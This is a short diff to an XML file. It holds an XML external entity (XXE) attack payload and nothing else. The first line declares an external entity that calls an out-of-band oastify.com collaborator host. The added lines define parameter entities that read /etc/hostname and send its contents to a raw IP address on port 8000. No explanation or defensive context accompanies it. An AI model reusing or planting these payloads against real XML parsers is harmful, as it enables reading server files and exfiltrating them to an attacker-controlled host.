@@ -1,1 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE dtngdxz [<!ENTITY dtngdxzent SYSTEM "http://jk724f1unu104wmnaz37yxh4ovulia.oastify.com">]><xxe>&dtngdxzent;</xxe>
+
+
+
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://147.182.223.68:8000/?x=%file;'>">
+%eval;
+%exfil;
